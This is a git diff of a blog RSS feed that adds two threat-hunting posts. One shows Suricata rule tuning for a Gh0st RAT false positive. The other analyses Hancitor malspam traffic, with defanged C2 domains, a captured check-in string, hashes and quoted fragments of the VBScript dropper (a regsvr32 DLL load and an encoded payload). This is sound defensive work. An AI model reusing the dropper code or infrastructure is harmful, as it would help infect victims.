@@ -5,9 +5,380 @@
         <description></description>
         <link>http://localhost:4000/</link>
         <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-        <pubDate>Wed, 18 Mar 2020 16:17:04 -0500</pubDate>
-        <lastBuildDate>Wed, 18 Mar 2020 16:17:04 -0500</lastBuildDate>
+        <pubDate>Thu, 30 Apr 2020 13:48:43 -0500</pubDate>
+        <lastBuildDate>Thu, 30 Apr 2020 13:48:43 -0500</lastBuildDate>
         <generator>Jekyll v4.0.0</generator>
+        
+            <item>
+                <title>4/30/2020 - Tuning Suricata</title>
+                <author>Andrew D. Pease</author>
+                <description>&lt;h1 id=&quot;4302020---tuning-suricata&quot;&gt;4/30/2020 - Tuning Suricata&lt;/h1&gt;
+&lt;p&gt;No packets to share this time as this was from a real hunt op.&lt;/p&gt;
+
+&lt;p&gt;I had a bit of a scare around a RAT and wanted to walk through the tuning process because I think it’s a task for thrunters…if it &lt;em&gt;should&lt;/em&gt; be a task for us is another story.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/thrunting-detection-engineering.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;First off, you can see where some tuning has been done in the identification of network noise, this is part of the process when doing IR - identifying false positives and network weirdness/oddities.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/4-30-20-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some wide swath tuning, we had some hits for some Emerging Threats rules, which is more interesting. Of specific note, that I spent some time on, was &lt;code class=&quot;highlighter-rouge&quot;&gt;ET TROJAN Backdoor family PCRat/Gh0st CnC traffic&lt;/code&gt; and it was quite an exciting dance.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/4-30-20-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After seeing the hit on the Suricata dashboard, I applied it as a filter by clicking on the &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt; and then saw that we were looking at 8 source IPs. That was instantly more interesting in that it wasn’t the whole network hitting this signature. Also of note was that it was port &lt;code class=&quot;highlighter-rouge&quot;&gt;135&lt;/code&gt; (which became helpful later).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/4-30-20-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In digging in a bit more, I hopped over to Discover to see what was happening around the alert. There was NTLM authentication, the alert, and then DCE_RPC traffic. I focused on a single IP to start and then looked at the other 8 to see if the traffic was the same, and it was.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/4-30-20-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, next I wanted to check the Suricata rule to see what exactly what happening. Expanding the event in Kibana showed me that the &lt;code class=&quot;highlighter-rouge&quot;&gt;rule.id&lt;/code&gt; field was &lt;code class=&quot;highlighter-rouge&quot;&gt;2016922&lt;/code&gt;. So let’s look at that rule on the sensor to see what’s going on.&lt;/p&gt;
+
+&lt;p&gt;With &lt;a href=&quot;https://twitter.com/dcode&quot;&gt;dcode&lt;/a&gt;’s help, we can see that it’s looking for the content &lt;code class=&quot;highlighter-rouge&quot;&gt;78 9c&lt;/code&gt; (among other things).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 2016922 /var/lib/suricata/rules/suricata.rules
+
+alert tcp $HOME_NET !80 -&amp;gt; $EXTERNAL_NET [!5721,!5938] (msg:&quot;ET TROJAN Backdoor family PCRat/Gh0st CnC traffic&quot;; flow:to_server,established; dsize:&amp;gt;11; content:&quot;|78 9c|&quot;; offset:8; byte_jump:4,-10,relative,little,from_beginning,post_offset -1; isdataat:!2,relative; content:!&quot;PWHDR&quot;; depth:5; metadata: former_category MALWARE; reference:url,www.securelist.com/en/descriptions/10155706/Trojan-GameThief.Win32.Magania.eogz; reference:url,www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin32%2FPcClient.ZR&amp;amp;ThreatID=-2147325231; reference:url,labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/; reference:url,www.infowar-monitor.net/2009/09/tracking-ghostnet-investigating-a-cyber-espionage-network/; reference:url,blogs.rsa.com/will-gragido/lions-at-the-watering-hole-the-voho-affair/; reference:url,www.norman.com/about_norman/press_center/news_archive/2012/the_many_faces_of_gh0st_rat/en; classtype:trojan-activity; sid:2016922; rev:14; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, tag PCRAT, tag Gh0st, tag RAT, signature_severity Critical, created_at 2013_04_23, malware_family Gh0st, malware_family PCRAT, updated_at 2019_08_06;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay, now we know what the signature is looking for, lets see what caused it to trip by carving the PCAP with Docket (the &lt;code class=&quot;highlighter-rouge&quot;&gt;Query PCAP&lt;/code&gt; field in ROCK) and analyzing it in Wireshark.&lt;/p&gt;
+
+&lt;p&gt;Searching for the content we identified in the rule (&lt;code class=&quot;highlighter-rouge&quot;&gt;78 9c&lt;/code&gt;) we can now see what’s causing the hit. &lt;code class=&quot;highlighter-rouge&quot;&gt;789c&lt;/code&gt; is in the New Technology Local Area Network Manager Security Support Provider (NTLMSSP) Verifier Body! NTLM is a suite of protocols used by Microsoft to provide authentication. It looks like the NTLMSSSP Verifier Body, which is a sequence of bytes, is causing the hit when &lt;code class=&quot;highlighter-rouge&quot;&gt;789c&lt;/code&gt; shows up.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/4-30-20-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Phew…a false positive. Now what? Let’s make some changes to the Suricata rule so we’re not seeing it for NTLM.&lt;/p&gt;
+
+&lt;p&gt;We can make the change by creating a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;modify.conf&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/suricata&lt;/code&gt; directory on ROCK. This will ensure that the changes persist through rule updates using &lt;code class=&quot;highlighter-rouge&quot;&gt;suricata-update&lt;/code&gt;. The modify file works by defining the rule ID (sid), what it is currently and then what you want to change it to.&lt;/p&gt;
+
+&lt;p&gt;So the ports for the rule already state &lt;code class=&quot;highlighter-rouge&quot;&gt;!5721,!5938&lt;/code&gt;, so let’s change it to also exclude port &lt;code class=&quot;highlighter-rouge&quot;&gt;135&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo vi /etc/suricata/modify.conf
+
+# Add the following
+# Changing ET TROJAN Backdoor family PCRat/Gh0st CnC traffic to not flag on NTLMSSP Verifier Body content
+2016922 &quot;!5721,!5938&quot; &quot;!5721,!5938,!135&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Let’s apply the new rules with &lt;code class=&quot;highlighter-rouge&quot;&gt;suricata-update&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo -u suricata -g suricata suricata-update
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next we can check to make sure that the rule worked with &lt;code class=&quot;highlighter-rouge&quot;&gt;grep 2016922 /var/lib/suricata/rules/suricata.rules&lt;/code&gt; and we should see &lt;code class=&quot;highlighter-rouge&quot;&gt;!135&lt;/code&gt; added (&lt;code class=&quot;highlighter-rouge&quot;&gt;$EXTERNAL_NET [!5721,!5938,!135]&lt;/code&gt;).&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp $HOME_NET !80 -&amp;gt; $EXTERNAL_NET [!5721,!5938,!135] (msg:&quot;ET TROJAN Backdoor family PCRat/Gh0st CnC traffic&quot;; flow:to_server,established; dsize:&amp;gt;11; content:&quot;|78 9c|&quot;; offset:8; byte_jump:4,-10,relative,little,from_beginning,post_offset -1; isdataat:!2,relative; content:!&quot;PWHDR&quot;; depth:5; metadata: former_category MALWARE; reference:url,www.securelist.com/en/descriptions/10155706/Trojan-GameThief.Win32.Magania.eogz; reference:url,www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin32%2FPcClient.ZR&amp;amp;ThreatID=-2147325231; reference:url,labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/; reference:url,www.infowar-monitor.net/2009/09/tracking-ghostnet-investigating-a-cyber-espionage-network/; reference:url,blogs.rsa.com/will-gragido/lions-at-the-watering-hole-the-voho-affair/; reference:url,www.norman.com/about_norman/press_center/news_archive/2012/the_many_faces_of_gh0st_rat/en; classtype:trojan-activity; sid:2016922; rev:14; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, tag PCRAT, tag Gh0st, tag RAT, signature_severity Critical, created_at 2013_04_23, malware_family Gh0st, malware_family PCRAT, updated_at 2019_08_06;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Restart Suricata (&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl restart suricata&lt;/code&gt;) to pick up the new rules and you’re golden.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hulk-rule-tuning.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+                <pubDate>Thu, 30 Apr 2020 00:00:00 -0500</pubDate>
+                <link>http://localhost:4000/2020/04/30/suricata-tuning.html</link>
+                <guid isPermaLink="true">http://localhost:4000/2020/04/30/suricata-tuning.html</guid>
+                
+                <category>feed</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>3/20/2020 - Hancitor w/Coronavirus Themed Malspam</title>
+                <author>Andrew D. Pease</author>
+                <description>&lt;h1 id=&quot;3202020---hancitor-infection-wcoronavirus-themed-malspam&quot;&gt;3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://malware-traffic-analysis.net/2020/03/11/index.html&quot;&gt;Packets&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cyber.nj.gov/threat-profiles/trojan-variants/hancitor&quot;&gt;Hancitor Downloader background (AKA Chanitor)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Unless you’ve been living under a rock, you’re aware of the global COVID-19 pandemic, also known as Coronavirus…actually…even if you’re under a rock, you’re still likely aware. Adversaries commonly capitalize on these type of events for their malspam lures, &lt;a href=&quot;https://krebsonsecurity.com/2020/03/live-coronavirus-map-used-to-spread-malware/&quot;&gt;COVID is no different&lt;/a&gt;. If the bad guys are using this, as defenders, we need to be prepared. In this situation, malspam is used to distribute the Hancitor (Chanitor) downloader. @mesa_matt reported this wave of COVID malspam &lt;a href=&quot;https://twitter.com/mesa_matt/status/1237808758669094913&quot;&gt;here&lt;/a&gt; and then by &lt;a href=&quot;https://isc.sans.edu/forums/diary/Hancitor+distributed+through+coronavirusthemed+malspam/25892/&quot;&gt;SANS&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We’ll start over on the Suricata dashboard to see if anything look suspicious, and as per normal, we have a hint of where to start with the &lt;code class=&quot;highlighter-rouge&quot;&gt;ET MALWARE Fareit/Pony Downloader Checkin 2&lt;/code&gt; alert. As we commonly see with these infections, adversaries frequently do an external IP lookup to see where they are and/or to validate they’ve infected the right victim (for targeted intrusions); that said, remember that an external IP lookup, while interesting, isn’t a smoking gun - so we’ll put that in the “interesting” vs. the “evidence” pile.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Filtering on the Pony Downloader alert, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;10.3.11.101&lt;/code&gt; looks like the internal host as well as &lt;code class=&quot;highlighter-rouge&quot;&gt;45[.]153[.]73[.]33&lt;/code&gt; as the, we’ll call it C2 because the alert calls it &lt;code class=&quot;highlighter-rouge&quot;&gt;Downloader Checkin 2&lt;/code&gt;, external host of interest. Of note, this connection is over port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;, so we should have good metadata to dig through. We’ll also use the HTTP dashboard to see what it can tell us.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we move away from the Suricata dashboard, the alert is called Pony, which is part of the process that Hanciator uses to burrow into an infected system - usually Pony is delivered via a macro-enabled document, with a VBScript, that acts as an installer to download Pony and then Hancitor &lt;a href=&quot;https://www.reddit.com/r/blackhat/comments/5oee1h/what_is_a_pony_downloader/&quot;&gt;1&lt;/a&gt;, &lt;a href=&quot;https://www.proofpoint.com/us/threat-insight/post/hancitor-ruckguv-reappear&quot;&gt;2&lt;/a&gt;, &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html&quot;&gt;3&lt;/a&gt;. Using that OSINT, we know that we’re probably looking for a VB macro, which likely means an Office document.&lt;/p&gt;
+
+&lt;p&gt;Okay, lets pop on over to ROCK’s HTTP dashboard and see what we can learn about &lt;code class=&quot;highlighter-rouge&quot;&gt;45[.]153[.]73[.]33&lt;/code&gt;. Here when we apply the filter for our bad IP address, we can see the HOST (&lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt;) and the URI’s…all PHP files (&lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/d2/about[.]php&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/mlu/forum[.]php&lt;/code&gt;). &lt;a href=&quot;https://www.php.net/&quot;&gt;PHP&lt;/a&gt; is a web-centric scripting language that is perfect for all kinds of useful applications…and malware.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Applying different filters to this dashboard shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;10.3.11.101&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;45[.]153[.]73[.]33&lt;/code&gt; are the only two systems talking back and forth with &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt;, so lets look in the Discover app to learn a bit more.&lt;/p&gt;
+
+&lt;p&gt;I’ve searched for the host that we’re interested in and applied the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; dataset filter. Of note, I’ve added fields that I’m most interested in source IP, URL, etc. but I’ve also added the &lt;code class=&quot;highlighter-rouge&quot;&gt;Query PCAP&lt;/code&gt; field so that I can use that to quickly carve the packets using Docket and Stenographer, both built into RockNSM. This traffic is over port 80 and likely unencrypted, so we should be able to get some good data from it. Finally, we’ll know more when we look at the HTTP headers, but the HTTP Method is a POST, so this is likely data exfil or a checkin of some type.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’ll carve the PCAPs for &lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/d2/about[.]php&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;/mlu/forum[.]php&lt;/code&gt; to analyze them.&lt;/p&gt;
+
+&lt;p&gt;With the first &lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt;, we can see that this is uploading a GUID and build number of the implant along with the hostname (&lt;code class=&quot;highlighter-rouge&quot;&gt;[redacted]-WIN10&lt;/code&gt;), the userID (&lt;code class=&quot;highlighter-rouge&quot;&gt;[redacted]-WIN10\[username]&lt;/code&gt;) and the host IP address (&lt;code class=&quot;highlighter-rouge&quot;&gt;IP=[redacted]&lt;/code&gt;) along with a Base64 encoded string&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NMNMARZAEg4OCkBVVQkSFQpUGwgOGxwcExQTDg4fH1QZFRdVDQpXExQZFg8eHwlVCRUeEw8XJRkVFwo
+bDlVLBhIODgpAVVUYHw4bVBsIDhscHBMUEw4OHx9UGRUXVQ0KVxMUGRYPHh8JVRwVFA4JVUsGEg4OCg
+lAVVUJEwkJVBkVVBMUVUsGEg4OCkBVVRcTGQgVGBYbHhMUHREPFg8YD1QZFRdVSwYSDg4KQFVVCQ4VG
+REXGwgRHw4IHwwVFg8OExUUVBkVF1VLBwEYQBIODgpAVVUJEhUKVBsIDhscHBMUEw4OHx9UGRUXVQ0K
+VxMUGRYPHh8JVQkVHhMPFyUZFRcKGw5VSAYSDg4KQFVVGB8OG1QbCA4bHBwTFBMODh8fVBkVF1UNClc
+TFBkWDx4fCVUcFRQOCVVIBhIODgoJQFVVCRMJCVQZFVQTFFVIBhIODgpAVVUXExkIFRgWGx4TFB0RDx
+YPGA9UGRUXVUgGEg4OCkBVVQkOFRkRFxsIER8OCB8MFRYPDhMVFFQZFRdVSAc=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This is followed by posting binary files from &lt;code class=&quot;highlighter-rouge&quot;&gt;/d2/about[.]php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/mlu/forum[.]php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-5.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/3-20-20-6.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/3-20-20-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After the initial &lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;/d2/about[.]php&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;/mlu/forum[.]php&lt;/code&gt;, there are 3 more POSTs to &lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt; which have 2 different Base64 encoded strings (&lt;code class=&quot;highlighter-rouge&quot;&gt;CMNXARRABw==&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;AZAZARRABw==&lt;/code&gt;). In checking online for those strings, there was 1 link to &lt;a href=&quot;https://www.hybrid-analysis.com/sample/fdbc89d95c002985f71ef3a8471bded05e71559874f36dd12186def8eef73e81?environmentId=100&quot;&gt;Hybrid-Analysis&lt;/a&gt; for a Hancitor analysis from 2018 (we knew this was Hancitor already, but this is the first evidence pointing us that direction).&lt;/p&gt;
+
+&lt;p&gt;Now that we have a good hit regarding &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt;, let’s remove &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/4/forum[.]php&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/d2/about[.]php&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;/mlu/forum[.]php&lt;/code&gt; and move onto other suspicious traffic.&lt;/p&gt;
+
+&lt;p&gt;When looking at the remaining traffic, it became pretty obvious that there was more than I could just sift through in the Discover app and honestly say I found bad traffic. So, let’s profile the DNS traffic, use a data table visualization, and remove the IP lookup API (&lt;code class=&quot;highlighter-rouge&quot;&gt;api.ipify.org&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt;…ah, 2 entries and we now have 4 additional indicators to research to see if they are bad (2 hosts, 2 IPs)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets start with the hosts (&lt;code class=&quot;highlighter-rouge&quot;&gt;freetospeak[.]me&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;shop[.]artaffinittee[.]com&lt;/code&gt;) and see what else we know about them. Looking at the DNS, domains, and files, we can see that there is a file located at &lt;code class=&quot;highlighter-rouge&quot;&gt;freetospeak[.]me/0843_43[.]php&lt;/code&gt;, but the filename is &lt;code class=&quot;highlighter-rouge&quot;&gt;SE-670131329809_5500[.]zip&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we move further into &lt;code class=&quot;highlighter-rouge&quot;&gt;freetospeak[.]me&lt;/code&gt;, let’s look at that IP address (&lt;code class=&quot;highlighter-rouge&quot;&gt;8[.]208[.]77[.]171&lt;/code&gt;) and see if anyone else communicated with that IP and no one did. This is the proper process for analysis, but sometimes there’s not any additional data.&lt;/p&gt;
+
+&lt;p&gt;Moving on, we’ll grab the packets to see what’s there, but in doing a quick Google search for &lt;code class=&quot;highlighter-rouge&quot;&gt;0843_43.php&lt;/code&gt; I can see that &lt;a href=&quot;https://urlhaus.abuse.ch/url/323970/&quot;&gt;Abuse.ch&lt;/a&gt; has listed some of the payloads that are delivered from this URI and they follow what we’ve observed - two capital letters, a dash, 12 numbers, an underscore, 4 numbers, and a zip file extension. We’ll have a regex search in the Detection Logic section, but lets check out the packets.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets use the Export HTTP Object of Wireshark to grab that file so we can do some additional analysis. Running the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command, we see that this isn’t a PHP file, but a zip archive (we assumed that based on the file.name field in ROCK, but that’s why we check).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/file 0843_43.php
+0843_43.php: Zip archive data, at least v2.0 to extract
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great, let’s grab some metadata about the file with &lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/local/bin/exiftool 0843_43.php
+ExifTool Version Number         : 11.85
+File Name                       : 0843_43.php
+Directory                       : .
+File Size                       : 225 kB
+File Modification Date/Time     : 2020:03:16 16:04:34-05:00
+File Access Date/Time           : 2020:03:16 16:04:48-05:00
+File Inode Change Date/Time     : 2020:03:16 16:04:53-05:00
+File Permissions                : rw-r--r--
+File Type                       : ZIP
+File Type Extension             : zip
+MIME Type                       : application/zip
+Zip Required Version            : 20
+Zip Bit Flag                    : 0
+Zip Compression                 : Deflated
+Zip Modify Date                 : 2020:03:10 19:22:42
+Zip CRC                         : 0x8780657b
+Zip Compressed Size             : 230297
+Zip Uncompressed Size           : 1130515
+Zip File Name                   : SE670131329809.vbs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can see that the &lt;code class=&quot;highlighter-rouge&quot;&gt;Zip File Name&lt;/code&gt; contains &lt;code class=&quot;highlighter-rouge&quot;&gt;SE670131329809.vbs&lt;/code&gt;. Interesting! Let’s list the contents of the zip file and see if there’s anything else interesting in there.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/unzip -l 0843_43.php
+Archive:  0843_43.php
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+  1130515  03-10-2020 19:22   SE670131329809.vbs
+---------                     -------
+  1130515                     1 file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can see that the archive was created on March 10, 2020 and that there is one file in there (&lt;code class=&quot;highlighter-rouge&quot;&gt;SE670131329809.vbs&lt;/code&gt;). Let’s unzip and poke around on the file.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/unzip -K 0843_43.php
+Archive:  0843_43.php
+  inflating: SE670131329809.vbs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now, let’s grab the hash of this script and see if anyone else has already done the hard work.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/sbin/md5 SE670131329809.vbs
+MD5 (SE670131329809.vbs) = 8eb933c84e7777c7b623f19489a59a2a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;As it would turn out, it looks like someone has already submitted this to &lt;a href=&quot;https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/detection&quot;&gt;VirusTotal&lt;/a&gt; and its got a 20/59 score, so this looks like a good hit! As we continue to look at the &lt;a href=&quot;https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/behavior/Lastline&quot;&gt;behavior&lt;/a&gt; of this file, it looks like it’s responsible for our connections to &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbeks[.]com&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;api[.]ipify[.]org&lt;/code&gt; (this is great because now we have a real reason to look at IPIFY, whereas before it was just suspicious, but now we can connect it to malware, so we can dig into that more), and a new domain (&lt;code class=&quot;highlighter-rouge&quot;&gt;cludions[.]com&lt;/code&gt; - but we don’t have any traffic to that domain in our sample). Of note, VT has some neat node analysis of this sample &lt;a href=&quot;https://www.virustotal.com/graph/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now that we’ve got a solid line between IPIFY and our infected host, so let’s see who communicated with that external service. It doesn’t look like anyone beyond our known infected host did, but this is an example of connecting something suspicious to known bad. We don’t do figurative hand-waving here, so it was good to make that association.&lt;/p&gt;
+
+&lt;p&gt;Before we move on, let’s take a look at the VBScript. I’ll caveat it with the fact that we’ll just going to look and see if there’s anything of value here vs. trying to RE it.&lt;/p&gt;
+
+&lt;p&gt;First off, looking at the metadata, it appears that it was also created on 3/10 (same as the time that it was added to the zip archive it was stored in). It’s unclear if this was an automated process, indicating this is a process to create mass volumes of files for multple campaigns…but based on what was observed &lt;a href=&quot;https://urlhaus.abuse.ch/url/323970/&quot;&gt;online&lt;/a&gt;, this is likely auto-created and archived.&lt;/p&gt;
+
+&lt;p&gt;It contains a bunch of numbers+&lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt; at the beginning and end of the script. I have an assumption that this is some sort of binary that is fed into &lt;code class=&quot;highlighter-rouge&quot;&gt;Dim GtYbDTHjR: Set GtYbDTHjR=CreateObject(&quot;Scripting.FileSystemObject&quot;): Dim etEWDmZOL: Set etEWDmZOL=CreateObject(&quot;ADODB.Stream&quot;)&lt;/code&gt; to create either Pony or Hancitor, and then registered as a DLL with &lt;code class=&quot;highlighter-rouge&quot;&gt;.Create &quot;regsvr32.exe -s &quot;+CStr(WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(Cint(&quot;2&quot;))+&quot;\&quot;)+&quot;adobe.txt&quot;,,,processid&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'3l70l69l69l79l69l69l69l259l70l69l69l69l69l69l69l69l69l69l69l69l69l69l133l69l69
+l133l115l169l166l185l166l69l69l69l113l75l71l69l69l309l70l69l69l75l71l69l69l269l
+70l69l69l69l69l69l69l69l69l69l69l69l69l69l133l69l69l261l115l183l184l183l168l69l
+69l69l169l77l69l69l69l69l73l69l69l79l69l69l69l275l72l69l69l69l69l69l69l69l69l69
